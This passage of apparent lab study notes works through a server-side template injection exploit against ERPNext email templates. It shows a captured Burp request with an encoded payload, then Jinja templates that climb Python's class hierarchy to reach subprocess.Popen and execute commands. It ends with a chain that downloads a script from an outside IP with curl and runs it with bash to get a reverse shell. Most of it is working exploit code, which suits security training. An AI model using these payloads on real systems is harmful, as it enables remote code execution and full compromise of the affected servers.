Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Frappe-CSRF-Token: 40d982af267589a752055032bae9b3c93261930c6e99d04e4462a524
X-Frappe-CMD: 
X-Requested-With: XMLHttpRequest
Content-Length: 948
Origin: http://erpnext:8000
Connection: close
Referer: http://erpnext:8000/desk
Cookie: user_image=; system_user=yes; user_id=Administrator; full_name=Administrator; sid=63a960ebd19d5a6b6a5215c323fae00017887e50991a732fdbfcf809

template_name=Hacking+With+SSTI&doc=%7B%22modified_by%22%3A%22Administrator%22%2C%22owner%22%3A%22Administrator%22%2C%22name%22%3A%22Hacking+With+SSTI%22%2C%22modified%22%3A%222024-08-28+19%3A54%3A55.796500%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22idx%22%3A0%2C%22subject%22%3A%22Hacking+With+SSTI%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22creation%22%3A%222024-08-28+16%3A42%3A59.129341%22%7D&_lang=
```

To simplify output review, let's clean up this list in Visual Studio Code. We'll copy all the classes, starting with "<class 'list'>" and ending with the last class object.

Next, we will replace all ",\ " strings (including the space character) with a new line character. To do this, let's open the "Find and Replace" dialog by pressing C+h. In the "Find" section we will enter ",\ " and in the "Replace" section we will press B+I to add a new line. Finally, we will select Replace All.

Figure 66: Find And Replace in Visual Studio Code
Figure 66: Find And Replace in Visual Studio Code
This provides a pre-numbered list, making it easier to find the index number to use when we need to reference it in the payload.

One of the classes that seems interesting is subprocess.Popen. The subprocess class allows us to "spawn new processes, connect to their input/output/error pipes, and obtain their return codes".1 This class is very useful when attempting to gain code execution.

We can find the subprocess class on line 421 (your result might vary). Let's attempt to access index 420 (Python indexes start at 0) and inspect the result by appending "[420]" to the payload.

{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420] }}
Listing 76 - Accessing the 420th index of __subclasses__

Rendering this function returns the subprocess.Popen class.

For me it was 656 instead of 420

#### Gaining Remote Command Execution

With access to a class that allows for code execution, we can finally put all the pieces together and obtain RCE on ERPNext.

To successfully execute Popen, we need to pass in a list containing a command that we want to execute along with the arguments. As a proof of concept, let's touch a file in /tmp/. The binary we want to execute and the file we want to touch will be two strings in a list. The example we are using can be found in Listing 77.

["/usr/bin/touch","/tmp/das-ist-walter"]
Listing 77 - Popen argument to be passed in

The content in Listing 77 needs to be placed within the Popen arguments in the email template. The email template to execute the touch command is as follows:

{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
Listing 78 - Template for touching file

Rendering this template in Burp won't return the output, but instead a Popen object based off the execution. Using an SSH session, we can verify that the file was successfully created.

frappe@ubuntu:~$ ls -lh /tmp/das-ist-walter 
-rw-rw-r-- 1 frappe frappe 0 Jan 11 10:31 das-ist-walter
Listing 79 - Verifying existence of touched file

It worked! We can now execute commands against the ERPNext system.


Revshell in multiple step:

```
{% set string = "ssti" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}

{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[1]|attr(subclasses)() %}

{{ subclasses_r[889](["/usr/bin/curl","http://192.168.45.210:9999/revshell","-o","/tmp/revshell"])  }}

{{ subclasses_r[889](["/bin/bash","/tmp/revshell"]) }}
```


